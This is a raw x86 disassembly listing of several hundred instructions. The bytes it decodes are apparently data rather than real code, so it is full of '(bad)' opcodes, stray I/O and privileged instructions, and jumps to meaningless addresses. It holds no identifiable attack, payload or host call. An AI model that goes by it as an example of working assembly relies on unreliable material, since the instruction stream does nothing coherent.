  48385e:	in     al,0xe1
  483860:	xchg   esi,eax
  483861:	sub    esi,0x1d
  483864:	cmp    ebx,eax
  483866:	cli    
  483867:	clc    
  483868:	dec    ecx
  483869:	and    BYTE PTR [esi],bl
  48386b:	mov    DWORD PTR [ecx+ebp*8],edx
  48386e:	jno    0x483867
  483870:	rcr    BYTE PTR [esi],cl
  483872:	bound  esi,QWORD PTR [eax+0x6bc0c5fb]
  483878:	or     al,0xe9
  48387a:	push   edx
  48387b:	imul   edx,DWORD PTR [eax-0xcb77ebd],0xc73cd696
  483885:	mov    edi,0x51b83fa
  48388a:	std    
  48388b:	repnz adc eax,0xfbff5460
  483891:	jmp    0x483899
  483893:	ss dec ebx
  483895:	aaa    
  483896:	out    dx,eax
  483897:	mov    edx,0xa14d8898
  48389c:	mov    ds:0x4236a60c,eax
  4838a1:	pusha  
  4838a2:	ins    DWORD PTR es:[edi],dx
  4838a3:	push   ss
  4838a4:	(bad)  
  4838a6:	sub    DWORD PTR [eax+esi*8-0x42479fb4],ebx
  4838ad:	push   esp
  4838ae:	push   edi
  4838af:	(bad)  
  4838b0:	and    eax,0x7805180c
  4838b5:	jmp    DWORD PTR [edi-0x3fda89ed]
  4838bb:	mul    DWORD PTR [edi+0x550ac0d0]
  4838c1:	push   esi
  4838c2:	add    DWORD PTR [eax+eax*4+0x70894f87],eax
  4838c9:	test   BYTE PTR [eax+0x3a],cl
  4838cc:	scas   eax,DWORD PTR es:[edi]
  4838cd:	(bad)  
  4838ce:	adc    al,BYTE PTR [edi+0x5c]
  4838d1:	imul   esi,DWORD PTR [edx],0x838d0083
  4838d7:	cmp    al,0x5b
  4838d9:	fs inc ebp
  4838db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4838dc:	pop    edi
  4838dd:	mov    ecx,DWORD PTR [eax-0x36]
  4838e0:	or     cl,BYTE PTR [eax]
  4838e2:	outs   dx,BYTE PTR ds:[esi]
  4838e3:	dec    edx
  4838e4:	add    al,0x14
  4838e6:	push   esp
  4838e7:	cmp    edx,DWORD PTR [edi+0x484803f0]
  4838ed:	enter  0x101c,0x4c
  4838f1:	push   0x17
  4838f3:	sbb    ebp,esp
  4838f5:	fsub   DWORD PTR [edi]
  4838f7:	ret    0x2842
  4838fa:	cmp    al,BYTE PTR [esi]
  4838fc:	in     eax,dx
  4838fd:	pop    ebp
  4838fe:	pop    edi
  4838ff:	jmp    0xc52b:0x46a0442
  483906:	adc    ch,cl
  483908:	and    al,0x67
  48390a:	xor    esp,ecx
  48390c:	cmp    BYTE PTR [edi-0x6b3640a3],dh
  483912:	push   es
  483913:	sub    eax,0x9373ed2c
  483918:	lea    eax,[eax-0x7a]
  48391b:	inc    edx
  48391c:	inc    esi
  48391d:	and    ecx,DWORD PTR [edx]
  48391f:	mov    ch,0xdf
  483921:	mov    ch,0x60
  483923:	lock pusha 
  483925:	frstor [edi+esi*8+0x7dfa8b9]
  48392c:	sar    BYTE PTR [edx],0x4
  48392f:	int3   
  483930:	test   al,0xe9
  483932:	aam    0x27
  483934:	cli    
  483935:	dec    esp
  483936:	ins    DWORD PTR es:[edi],dx
  483937:	sub    DWORD PTR [ecx+0xc870fec],0x803792b0
  483941:	fs adc dh,0x92
  483945:	mov    ebx,0xf40f023c
  48394a:	hlt    
  48394b:	pop    edi
  48394c:	je     0x48394e
  48394e:	inc    ecx
  48394f:	jle    0x48391b
  483951:	ins    DWORD PTR es:[edi],dx
  483952:	pop    es
  483953:	inc    ebx
  483954:	mov    ah,0x31
  483956:	fld    st(0)
  483958:	mov    cl,0x25
  48395a:	mov    BYTE PTR [ebp-0x6e],0x7
  48395e:	xor    dl,BYTE PTR [ecx]
  483960:	mov    bh,0x70
  483962:	mov    ah,0x1d
  483964:	mov    bl,0x70
  483966:	cmc    
  483967:	les    ebx,FWORD PTR [eax]
  483969:	pop    edi
  48396a:	push   es
  48396b:	sbb    ecx,DWORD PTR [esi]
  48396d:	or     ch,ch
  48396f:	add    DWORD PTR [esi],eax
  483971:	or     BYTE PTR [esp+ecx*4+0x29],al
  483975:	imul   ebx,DWORD PTR [esi],0x774e506
  48397b:	inc    ebx
  48397c:	hlt    
  48397d:	or     edx,DWORD PTR [esi+0x60]
  483980:	adc    BYTE PTR [edi-0x55],bl
  483983:	in     al,dx
  483984:	ret    
  483985:	and    al,0x7e
  483987:	mov    DWORD PTR [esi],eax
  483989:	add    esi,DWORD PTR [esi]
  48398b:	mov    eax,DWORD PTR [esi+0x3048da97]
  483991:	sbb    eax,DWORD PTR [edi+0x4]
  483994:	mov    cl,0x9
  483996:	cmp    DWORD PTR [ecx+0x2b2b5760],edi
  48399c:	adc    bh,dh
  48399e:	cmp    BYTE PTR [edx+0x4b],dh
  4839a1:	and    BYTE PTR [ecx],0xc1
  4839a4:	pushf  
  4839a5:	pop    esi
  4839a6:	inc    esp
  4839a7:	xor    DWORD PTR [eax+0x3c958312],0x342feca8
  4839b1:	push   cs
  4839b2:	stos   DWORD PTR es:[edi],eax
  4839b3:	mov    cl,0x75
  4839b5:	fistp  WORD PTR [edi]
  4839b7:	mov    dl,0x35
  4839b9:	pop    es
  4839ba:	xor    BYTE PTR [ebp-0x25],bl
  4839bd:	mov    bl,0xa7
  4839bf:	inc    eax
  4839c0:	add    DWORD PTR [ebx+esi*1-0x62],edi
  4839c4:	mov    bl,0xc6
  4839c6:	mov    ax,ds:0xeb430868
  4839cc:	retf   0x234f
  4839cf:	jo     0x483a14
  4839d1:	ins    BYTE PTR es:[edi],dx
  4839d2:	or     BYTE PTR [ebx+0x21],al
  4839d5:	mov    DWORD PTR [ebp-0x3f],edi
  4839d8:	rcl    DWORD PTR [ecx+0x4b],0xc8
  4839dc:	imul   DWORD PTR [ecx+0x79]
  4839df:	ret    0x6d0d
  4839e2:	ins    DWORD PTR es:[edi],dx
  4839e3:	retf   
  4839e4:	mov    edx,0x32c66042
  4839e9:	out    0x32,al
  4839eb:	xor    eax,0x931d0911
  4839f0:	dec    esi
  4839f1:	in     al,dx
  4839f2:	xchg   edi,eax
  4839f3:	or     al,0x37
  4839f5:	mov    bh,0x70
  4839f7:	add    bl,BYTE PTR [eax]
  4839f9:	mov    eax,0x3c3b13f8
  4839fe:	xchg   ecx,eax
  4839ff:	add    cl,BYTE PTR ds:0x9b7776b0
  483a05:	clc    
  483a06:	pop    esi
  483a07:	or     eax,0x7f9eac10
  483a0c:	jmp    0x483a14
  483a0e:	mov    bl,BYTE PTR ds:0x80b84924
  483a14:	shr    esp,1
  483a16:	bound  edx,QWORD PTR [edx]
  483a18:	or     BYTE PTR [ebx-0x7f],cl
  483a1b:	daa    
  483a1c:	nop
  483a1d:	push   edi
  483a1e:	push   esi
  483a1f:	add    cl,BYTE PTR [ebx]
  483a21:	and    eax,0xe88b5ffd
  483a26:	data16 outs dx,BYTE PTR ds:[esi]
  483a28:	inc    eax
  483a29:	xchg   ebp,eax
  483a2a:	mov    eax,ds:0x1430edc8
  483a2f:	xor    eax,DWORD PTR [esi+ebp*4-0x2c]
  483a33:	cs loopne 0x483a24
  483a36:	jmp    0x483a3f
  483a38:	sbb    al,0x11
  483a3a:	loopne 0x483a74
  483a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483a3d:	push   ecx
  483a3e:	or     eax,0x6d74830
  483a43:	xor    cl,BYTE PTR [ecx-0x2997fce7]
  483a49:	fwait
  483a4a:	nop
  483a4b:	call   0x1b71d4ab
  483a50:	xchg   DWORD PTR [ecx],eax
  483a52:	push   edi
  483a53:	cmp    esp,esp
  483a55:	dec    eax
  483a56:	or     BYTE PTR [eax+0x11],cl
  483a59:	std    
  483a5a:	into   
  483a5b:	adc    al,dl
  483a5d:	add    cl,BYTE PTR [edx+eiz*1+0x39750290]
  483a64:	dec    ebp
  483a65:	fidiv  DWORD PTR [eax+0x69c21ff3]
  483a6b:	inc    esp
  483a6c:	call   0xe4de:0x7050ca4c
  483a73:	sahf   
  483a74:	or     al,0x27
  483a76:	or     al,0x3c
  483a78:	sub    eax,0x114cb84b
  483a7d:	rcl    ecx,1
  483a7f:	(bad)  
  483a80:	xor    BYTE PTR ss:[eax],ah
  483a83:	cmp    BYTE PTR [ebx+edi*1],dl
  483a86:	loope  0x483a59
  483a88:	add    al,0x86
  483a8a:	test   BYTE PTR ds:0xa6150522,cl
  483a90:	out    dx,al
  483a91:	sub    DWORD PTR [eax],0xffffffde
  483a94:	mov    dl,BYTE PTR ds:0x17c00a2c
  483a9a:	div    DWORD PTR [esi]
  483a9c:	or     esp,DWORD PTR [ebp+ecx*4-0x1d]
  483aa0:	xchg   ebx,eax
  483aa1:	pop    ss
  483aa2:	push   ecx
  483aa3:	mov    ebx,0x30480325
  483aa8:	xchg   esp,eax
  483aa9:	pop    ss
  483aaa:	cmp    BYTE PTR [esi-0x80],0x2
  483aae:	xor    esp,DWORD PTR [eax+0x10626459]
  483ab4:	dec    eax
  483ab5:	and    ebx,ebp
  483ab7:	dec    esp
  483ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483ab9:	inc    ebx
  483aba:	pop    esi
  483abb:	push   0xc804ee91
  483ac0:	outs   dx,BYTE PTR ds:[esi]
  483ac1:	(bad)  
  483ac2:	rcr    BYTE PTR ds:0x868891ae,1
  483ac8:	cwde   
  483ac9:	fwait
  483aca:	ret    0x7d5
  483acd:	popf   
  483ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  483acf:	cld    
  483ad0:	out    dx,eax
  483ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483ad2:	ret    0x7e27
  483ad5:	add    eax,0x3a56080a
  483ada:	push   eax
  483adb:	pop    esp
  483adc:	je     0x483aee
  483ade:	mov    BYTE PTR [esi+0x7ac2270b],al
  483ae4:	jae    0x483b44
  483ae6:	mov    BYTE PTR [edx+0x6d],0x26
  483aea:	inc    edi
  483aeb:	psllw  mm0,QWORD PTR [edi-0x42]
  483aef:	retf   
  483af0:	and    edx,0xa
  483af3:	inc    ebx
  483af4:	test   BYTE PTR [edi+0x50],0x20
  483af8:	je     0x483b35
  483afa:	sub    edi,DWORD PTR [ecx+0x2]
  483afd:	or     eax,0x458135a1
  483b02:	push   0xffffffc1
  483b04:	test   DWORD PTR [esi+0x5d084712],edi
  483b0a:	ds ja  0x483b11
  483b0d:	mov    DWORD PTR [ecx+0x5],0xaef677c
  483b14:	and    DWORD PTR [edx*4-0x181a2db8],esi
  483b1b:	pusha  
  483b1c:	add    ch,bh
  483b1e:	not    DWORD PTR [ecx-0x77e4c21c]
  483b24:	pusha  
  483b25:	pusha  
  483b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483b27:	xor    cl,0x65
  483b2a:	jmp    0x5343:0xae97902
  483b31:	xlat   BYTE PTR ds:[ebx]
  483b32:	xor    DWORD PTR [eax+0x72],0xfffffff8
  483b36:	call   0x78e58d13
  483b3b:	jp     0x483ad1
  483b3d:	xor    BYTE PTR [ebx-0x36],al
  483b40:	adc    dl,bh
  483b42:	push   eax
  483b43:	mov    dh,0x17
  483b45:	jg     0x483b91
  483b47:	ret    
  483b48:	sbb    BYTE PTR [ebx],al
  483b4a:	inc    ebp
  483b4b:	dec    ebx
  483b4c:	xor    dl,BYTE PTR [ebx+0x40]
  483b4f:	xor    bl,al
  483b51:	sub    cl,ah
  483b53:	inc    esi
  483b54:	aad    0x18
  483b56:	(bad)  
  483b57:	dec    esp
  483b58:	cmp    eax,0x3b3d5fdd
  483b5d:	fidivr WORD PTR [esi+0x74]
  483b60:	jb     0x483b36
  483b62:	add    dh,BYTE PTR [eax]
  483b64:	and    eax,0x4fb4af8b
  483b69:	sbb    eax,0xd430037c
  483b6e:	mov    al,0x10
  483b70:	in     eax,dx
  483b71:	sbb    BYTE PTR [eax],al
  483b73:	xor    al,0x50
  483b75:	inc    esp
  483b76:	inc    esi
  483b77:	pop    es
  483b78:	xchg   edi,eax
  483b79:	popa   
  483b7a:	xchg   edi,eax
  483b7b:	paddb  mm7,QWORD PTR [edx]
  483b7e:	pop    edi
  483b7f:	push   edi
  483b80:	je     0x483bad
  483b82:	pushf  
  483b83:	int    0x88
  483b85:	push   ds
  483b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  483b87:	adc    DWORD PTR [ebx-0x5d75cbe2],ebx
  483b8d:	or     esi,DWORD PTR [eax+0x3857c738]
  483b93:	and    ecx,eax
  483b95:	(bad)  
  483b96:	xlat   BYTE PTR ds:[ebx]
  483b97:	adc    al,0x58
  483b99:	je     0x483bac
  483b9b:	out    dx,eax
  483b9c:	nop
  483b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483b9e:	mov    bl,0x88
  483ba0:	or     BYTE PTR [edx-0x50],dl
  483ba3:	or     al,0x90
  483ba5:	pop    ds
  483ba6:	stos   DWORD PTR es:[edi],eax
  483ba7:	(bad)  
  483ba8:	jge    0x483b72
  483baa:	push   cs
  483bab:	add    BYTE PTR [edx-0x46],dl
  483bae:	or     eax,0xac908b19
  483bb3:	mov    edi,0x63014810
  483bb8:	sar    BYTE PTR [esi-0x4],cl
  483bbb:	clc    
  483bbc:	xor    BYTE PTR [eax],ah
  483bbe:	int    0x90
  483bc0:	iret   
  483bc1:	es test al,0x48
  483bc4:	in     al,0xe0
  483bc6:	arpl   WORD PTR [edi+ebx*4],si
  483bc9:	mov    DWORD PTR [ebx+0x7c],esi
  483bcc:	jo     0x483be0
  483bce:	adc    BYTE PTR [edx],ah
  483bd0:	add    edi,DWORD PTR [eax+0x4]
  483bd3:	cmp    BYTE PTR [eiz*1+0x366e860e],ah
  483bda:	scas   eax,DWORD PTR es:[edi]
  483bdb:	push   edx
  483bdc:	jo     0x483bea
  483bde:	stc    
  483bdf:	mov    ebp,cs
  483be1:	idiv   BYTE PTR [ebp+0xb841269]
  483be7:	adc    DWORD PTR [ecx],ecx
  483be9:	xlat   BYTE PTR ds:[ebx]
  483bea:	ins    BYTE PTR es:[edi],dx
  483beb:	push   esp
  483bec:	inc    ebx
  483bed:	mov    al,0x35
  483bef:	stos   BYTE PTR es:[edi],al
  483bf0:	pusha  
  483bf1:	fcmove st,st(3)
  483bf3:	mov    cl,BYTE PTR [edi]
  483bf5:	pop    ebx
  483bf6:	cwde   
  483bf7:	cli    
  483bf8:	dec    ebx
  483bf9:	mov    ds:0xb3070062,al
  483bfe:	pop    ss
  483bff:	cmp    esp,esp
  483c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483c02:	das    
  483c03:	and    DWORD PTR [ecx],esp
  483c05:	sbb    al,0x27
  483c07:	jmp    0x2675bb18
  483c0c:	add    al,0xe1
  483c0f:	mov    DWORD PTR [ecx],ecx
  483c11:	push   cs
  483c12:	or     DWORD PTR [edx+0x28],ebp
  483c15:	neg    DWORD PTR [eax+0x30]
  483c18:	add    BYTE PTR [eax-0x6dc88f10],bh
  483c1e:	movq   mm5,QWORD PTR [edi+0x6e]
  483c22:	pop    edi
  483c23:	je     0x483c3a
  483c25:	mov    BYTE PTR [eax],cl
  483c27:	mov    BYTE PTR [eax+0x60],0x0
  483c2b:	ja     0x483c69
  483c2d:	test   esi,edx
  483c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483c30:	inc    ecx
  483c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483c32:	pusha  
  483c33:	add    BYTE PTR [esi],al
  483c35:	push   esi
  483c36:	fadd   DWORD PTR [edx+0x56]
  483c39:	xor    ebx,DWORD PTR [eax+ebp*2]
  483c3c:	cmp    eax,0xd619833b
  483c41:	imul   esi,DWORD PTR [ebx-0x747f9d09],0x892d1037
  483c4b:	jne    0x483ca5
  483c4d:	repnz pusha 
  483c4f:	jecxz  0x483c5f
  483c51:	cs stos BYTE PTR es:[edi],al
  483c53:	xor    BYTE PTR [esi+esi*1],0x5f
  483c57:	push   0x4b717804
  483c5c:	xor    bh,BYTE PTR [ebx+0x6]
  483c5f:	or     ah,BYTE PTR [edi+eiz*2-0x16a117d5]
  483c66:	mov    al,BYTE PTR [eax+0x3f01341a]
  483c6c:	mov    cl,BYTE PTR [esi]
  483c6e:	xor    al,0x27
  483c70:	pusha  
  483c71:	and    al,0x7b
  483c73:	sub    DWORD PTR [esi],0x881d7459
  483c79:	or     BYTE PTR [esi],dh
  483c7b:	(bad)  
  483c7d:	push   esp
  483c7e:	adc    BYTE PTR [esi+0x3f0ed4a2],ah
  483c84:	or     bh,dh
  483c86:	ins    DWORD PTR es:[edi],dx
  483c87:	lock and al,0x3a
  483c8a:	nop
  483c8b:	cdq    
  483c8c:	sbb    DWORD PTR [ebx],ebx
  483c8e:	mov    BYTE PTR [edi],cl
  483c90:	(bad)  
  483c91:	mov    ebp,DWORD PTR [ebp+0xdf21b4]
  483c97:	dec    ecx
  483c98:	and    al,BYTE PTR [esi-0x66]
  483c9b:	and    BYTE PTR [eax-0x12e379e1],cl
  483ca1:	setnp  BYTE PTR [ebx]
  483ca4:	push   ss
  483ca5:	cmp    edx,DWORD PTR [eax+0x49]
  483ca8:	inc    esi
  483ca9:	call   0x5a70:0x5089709b
  483cb0:	or     eax,0x5272a48
  483cb5:	cs pop edx
  483cb7:	pop    edx
  483cb8:	pop    edx
  483cb9:	and    al,0x95
  483cbb:	xchg   esi,eax
  483cbc:	in     al,0x9
  483cbe:	inc    esi
  483cbf:	pusha  
  483cc0:	pusha  
  483cc1:	lods   eax,DWORD PTR ds:[esi]
  483cc2:	mov    ds:0x663d724d,eax
  483cc7:	fdivr  DWORD PTR [eax-0x68]
  483cca:	data16 fidivr DWORD PTR [eax-0x1e]
  483cce:	adc    BYTE PTR [eax-0x11f0f0f9],dl
  483cd4:	ret    0xdc9
  483cd7:	cld    
  483cd8:	or     ch,0xec
  483cdb:	cmp    ebx,eax
  483cdd:	sbb    ch,BYTE PTR [esi]
  483cdf:	dec    ecx
  483ce0:	xor    BYTE PTR [edi-0x770150a5],ah
  483ce6:	add    esi,eax
  483ce8:	daa    
  483ce9:	ret    
  483cea:	xlat   BYTE PTR ds:[ebx]
  483ceb:	mov    cl,0x14
  483ced:	xor    al,0x99
  483cef:	ficom  WORD PTR ds:[edx]
  483cf2:	adc    DWORD PTR [eax+0x56],esp
  483cf5:	out    dx,al
  483cf6:	sub    dh,cl
  483cf8:	in     eax,0xd0
  483cfa:	or     BYTE PTR [eax],ch
  483cfc:	xchg   edi,eax
  483cfd:	add    bl,BYTE PTR [bx+si]
  483d00:	loop   0x483d35
  483d02:	stc    
  483d03:	ins    BYTE PTR es:[edi],dx
  483d04:	mov    eax,DWORD PTR [eax-0x510f2368]
  483d0a:	sbb    ch,BYTE PTR [esi+0x25]
  483d0d:	pop    ebx
  483d0e:	pushf  
  483d0f:	xor    BYTE PTR [ebx+0x1c8727ba],cl
  483d15:	fld    QWORD PTR [ebx+ebp*1]
  483d18:	xor    BYTE PTR ds:[eax+0x37],bh
  483d1c:	add    DWORD PTR [ecx+esi*2+0x31],ebp
  483d20:	mov    cl,0x1
  483d22:	add    eax,0x3794613b
  483d27:	mov    DWORD PTR [eax+0x1c],ebp
  483d2a:	les    edx,FWORD PTR [esp+edx*2+0x75]
  483d2e:	dec    edx
  483d2f:	or     ah,dh
  483d31:	sti    
  483d32:	shl    DWORD PTR ds:0xb6dc4525,1
  483d38:	dec    BYTE PTR [ebx+0x74c9f048]
  483d3e:	sbb    al,0xe2
  483d40:	fcomip st,st(3)
  483d42:	loopne 0x483d33
  483d44:	mov    edx,DWORD PTR [ecx+0x4a085287]
  483d4a:	push   0xfffffffe
  483d4c:	rcl    dl,1
  483d4e:	adc    ebx,eax
  483d50:	fst    DWORD PTR [eax]
  483d52:	adc    DWORD PTR [eax],0x17
  483d55:	adc    ecx,DWORD PTR [esi]
  483d57:	adc    BYTE PTR [ebp+0x69],bh
  483d5a:	mov    al,0x28
  483d5c:	out    0x20,ax
  483d5f:	push   cs
  483d60:	and    BYTE PTR [eax+ebx*2-0x6dbf73f4],al
  483d67:	fst    st(3)
  483d69:	mov    dh,0xd5
  483d6b:	pop    eax
  483d6c:	xor    BYTE PTR [edx],bl
  483d6e:	dec    esp
  483d6f:	dec    eax
  483d70:	mov    BYTE PTR [edx],al
  483d72:	xchg   ecx,eax
  483d73:	sbb    al,0x42
  483d75:	hlt    
  483d76:	rcl    DWORD PTR [eax+0xe101541],1
  483d7c:	dec    esi
  483d7d:	inc    ebx
  483d7e:	xchg   dh,al
  483d80:	xchg   esp,ebx
  483d82:	sub    DWORD PTR [eax],esp
  483d84:	daa    
  483d85:	popa   
  483d86:	mov    bl,0x1c
  483d88:	mov    DWORD PTR [ebx-0x47740271],eax
  483d8e:	lods   eax,DWORD PTR ds:[esi]
  483d8f:	mov    al,ds:0xb81b07f
  483d94:	adc    eax,0x4e4e7e93
  483d99:	test   al,0xd3
  483d9b:	sub    al,0x2
  483d9d:	fld    DWORD PTR [eax+0x501a147b]
  483da3:	enter  0x8438,0xe2
  483da7:	xor    cl,BYTE PTR [eax]
  483da9:	mov    esp,0xdc76144b
  483dae:	cmp    esi,edx
  483db0:	fcom   QWORD PTR [esi-0x2ef8ddba]
  483db6:	je     0x483da7
  483db8:	lds    ebx,FWORD PTR [eax-0x2a]
  483dbb:	les    ebx,FWORD PTR [edi]
  483dbd:	pop    ecx
  483dbe:	ins    BYTE PTR es:[edi],dx
  483dbf:	xor    ch,BYTE PTR [ebp+0xc]
  483dc2:	inc    esi
  483dc3:	loop   0x483e44
  483dc5:	mov    dl,0x9d
  483dc7:	imul   edi,DWORD PTR [eax-0x1d],0x4d880fab
  483dce:	jmp    0x483e47
  483dd0:	dec    ebp
  483dd1:	jb     0x483d69
  483dd3:	push   ebp
  483dd4:	stos   BYTE PTR es:[edi],al
  483dd5:	adc    ah,BYTE PTR [ebx]
  483dd7:	xor    ch,BYTE PTR [ecx-0x20]
  483dda:	jle    0x483d78
  483ddc:	jg     0x483def
  483dde:	push   ecx
  483ddf:	add    al,0x75
  483de1:	pusha  
  483de2:	call   DWORD PTR [edi+0x10]
  483de5:	call   0xc4ad:0x52d06d0d
  483dec:	in     al,dx
  483ded:	mov    ebp,0x22e0fd4d
  483df2:	add    eax,0xe4eb7d80
  483df7:	inc    ebx
  483df8:	js     0x483e3e
  483dfa:	loope  0x483e3b
  483dfc:	out    dx,al
  483dfd:	jne    0x483e0a
  483dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  483e00:	enter  0xb9c6,0x62
  483e04:	add    eax,DWORD PTR [eax]
  483e06:	sbb    al,0x8d
  483e08:	nop
  483e09:	fmul   DWORD PTR [esi]
  483e0b:	popa   
  483e0c:	in     eax,0x8b
  483e0e:	inc    esi
  483e0f:	mov    ecx,0x18cdb894
  483e14:	ja     0x483e85
  483e16:	or     dl,BYTE PTR [eax]
  483e18:	push   ss
  483e19:	loopne 0x483dfe
  483e1b:	mov    dl,BYTE PTR [eax+0x57]
  483e1e:	and    edi,eax
  483e20:	icebp  
  483e21:	mov    ebp,0xa9bf8588
  483e26:	adc    edi,DWORD PTR [ebx]
  483e28:	fidiv  WORD PTR [edi+ecx*1+0x61]
  483e2c:	outs   dx,BYTE PTR ds:[esi]
  483e2d:	je     0x483dcb
  483e2f:	inc    esp
  483e30:	cmp    al,0xc9
  483e32:	jg     0x483e4a
  483e34:	dec    eax
  483e35:	xlat   BYTE PTR ds:[ebx]
  483e36:	dec    ebp
  483e37:	adc    dl,al
  483e39:	inc    BYTE PTR [edx+edi*4]
  483e3c:	inc    ebx
  483e3d:	pop    ebx
  483e3e:	push   eax
  483e3f:	push   ecx
  483e40:	jo     0x483e82
  483e42:	mov    al,ds:0x1604da77
  483e47:	shl    BYTE PTR [eax-0x4],1
  483e4a:	inc    ecx
  483e4b:	popa   
  483e4c:	sbb    BYTE PTR [ecx+0x60a788e1],0x5
  483e53:	stos   BYTE PTR es:[edi],al
  483e54:	jmp    0x483eab
  483e56:	jl     0x483eaf
  483e58:	inc    eax
  483e59:	add    dl,bl
  483e5b:	or     al,0xe9
  483e5d:	out    0x8c,eax
  483e5f:	shr    edi,cl
  483e61:	pop    eax
  483e62:	fcmovb st,st(1)
  483e64:	sti    
  483e65:	jne    0x333f5831
  483e6b:	mov    ecx,0x2b693061
  483e70:	call   FWORD PTR [eax-0x5a]
  483e73:	outs   dx,DWORD PTR ds:[esi]
  483e74:	sbb    BYTE PTR [edx-0x3f],0x25
  483e78:	xchg   ebx,eax
  483e79:	mov    bl,0xc9
  483e7b:	fbld   TBYTE PTR [eax+0x79d40736]
  483e81:	adc    al,BYTE PTR [ebx-0x11]
  483e84:	shl    BYTE PTR [ecx],1
  483e86:	lods   al,BYTE PTR ds:[esi]
  483e87:	inc    eax
  483e88:	inc    esp
  483e89:	cmp    bl,BYTE PTR [ebp-0x4]
  483e8c:	add    ecx,DWORD PTR [ebx-0x23]
  483e8f:	cdq    
  483e90:	add    bl,dh
  483e92:	dec    esp
  483e93:	push   ecx
  483e94:	popa   
  483e95:	in     al,0x1d
  483e97:	dec    eax
  483e98:	enter  0x986,0xc6
  483e9c:	push   ecx
  483e9d:	push   edx
  483e9e:	leave  
  483e9f:	nop
  483ea0:	xchg   ebp,eax
  483ea1:	adc    ch,dh
  483ea3:	jp     0x483e7f
  483ea5:	iret   
  483ea6:	clc    
  483ea7:	mov    al,ds:0xbb9b1842
  483eac:	arpl   WORD PTR [ebx],si
  483eae:	xchg   ebx,eax
  483eaf:	cwde   
  483eb0:	dec    ebp
  483eb1:	fnstcw WORD PTR [ebp-0x4cd9791c]
  483eb7:	jecxz  0x483eea
  483eb9:	or     BYTE PTR [ebp+0xf9070ac],dh
  483ebf:	jmp    0xecac7d13
  483ec4:	or     eax,0x9b158be1
  483ec9:	jp     0x483ed8
  483ecb:	jns    0x483e7e
  483ecd:	and    BYTE PTR [ebp+0x12f5fdf],cl
  483ed3:	je     0x483eef
  483ed5:	push   ebp
  483ed6:	sub    BYTE PTR [ecx],0x8
  483ed9:	outs   dx,BYTE PTR ds:[esi]
  483eda:	pop    edi
  483edb:	xor    BYTE PTR [edx-0x30],dh
  483ede:	jmp    0x927c0105
  483ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483ee4:	les    esi,FWORD PTR [ecx]
  483ee6:	lock daa 
  483ee8:	and    dl,BYTE PTR [ecx]
  483eea:	mov    dl,BYTE PTR [edx+0x4]
  483eed:	sub    ah,bh
  483eef:	mov    BYTE PTR [ecx+eax*4],bh
  483ef2:	push   ebp
  483ef3:	pop    ss
  483ef4:	in     eax,0x72
  483ef6:	jnp    0x483f0e
  483ef8:	push   cs
  483ef9:	pop    bx
  483efb:	and    BYTE PTR [ecx-0x42],dh
  483efe:	adc    eax,0xbc055256
  483f03:	push   0x4aecf027
  483f08:	jecxz  0x483f52
  483f0a:	jns    0x483f15
  483f0c:	adc    edi,edi
  483f0e:	jne    0x483f75
  483f10:	popa   
  483f11:	imul   edx,esi,0xffffff91
  483f14:	add    edx,DWORD PTR [esp+edx*2+0x78]
  483f18:	cmp    BYTE PTR [edx+ecx*8+0x2d],dl
  483f1c:	or     BYTE PTR [ebx+0x31],ah
  483f1f:	aas    
  483f20:	aam    0x8b
  483f22:	(bad)  
  483f23:	dec    eax
  483f24:	push   esi
  483f25:	fimul  DWORD PTR [edx-0x4d]
  483f28:	add    al,0x24
  483f2a:	lods   eax,DWORD PTR ds:[esi]
  483f2b:	xor    ecx,DWORD PTR [esi-0x3b5f9c7c]
  483f31:	inc    esi
  483f32:	mov    eax,0x50807836
  483f37:	loope  0x483f3b
  483f39:	add    dl,ch
  483f3b:	or     BYTE PTR ss:[ecx+0x3edae434],ah
  483f42:	imul   esi,DWORD PTR [eax+0x8],0xffffffb3
  483f46:	fadd   DWORD PTR [ecx-0x44d0e6ef]
  483f4c:	add    bl,bh
  483f4e:	push   edi
  483f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483f50:	pusha  
  483f51:	sub    BYTE PTR [ebx-0x79],0x5
  483f55:	inc    ecx
  483f56:	outs   dx,BYTE PTR ds:[esi]
  483f57:	mov    bh,0x34
  483f59:	jmp    0x483f69
  483f5b:	arpl   ax,bp
  483f5d:	mov    BYTE PTR [esi],0x0
  483f60:	mov    edx,0x457f03f2
  483f65:	stos   DWORD PTR es:[edi],eax
  483f66:	pop    ds
  483f67:	sbb    BYTE PTR [ecx],al
  483f69:	or     BYTE PTR [ebp+0x10],0x51
  483f6d:	mov    cl,BYTE PTR [ebp+0xc]
  483f70:	push   ecx
  483f71:	xor    dl,BYTE PTR [ebp-0x35c9a299]
  483f77:	fdiv   st,st(4)
  483f79:	lock xchg edi,eax
  483f7b:	xchg   edi,eax
  483f7c:	cmp    eax,0x68776911
  483f81:	jmp    0x627d:0x865cef17
  483f88:	or     BYTE PTR [ecx+0x59],dl
  483f8b:	in     al,dx
  483f8c:	call   0xaefd43e7
  483f91:	mov    dl,0x3b
  483f93:	push   ecx
  483f94:	adc    al,BYTE PTR [ecx]
  483f96:	adc    al,BYTE PTR [edx+0x7b]
  483f99:	push   ss
  483f9a:	or     al,ah
  483f9c:	mov    bl,0x14
  483f9e:	add    DWORD PTR [eax],edx
  483fa0:	scas   eax,DWORD PTR es:[edi]
  483fa1:	fs in  eax,0x94
  483fa4:	cld    
  483fa5:	xchg   edi,eax
  483fa6:	sbb    al,BYTE PTR [ecx]
  483fa8:	sbb    al,0x1
  483faa:	sbb    BYTE PTR [ecx],al
  483fac:	add    DWORD PTR [ebp+ebp*8-0x3a],edx
  483fb0:	cmove  ebx,edx
  483fb3:	pop    esi
  483fb4:	mov    DWORD PTR [eax-0x7f6fa04d],eax
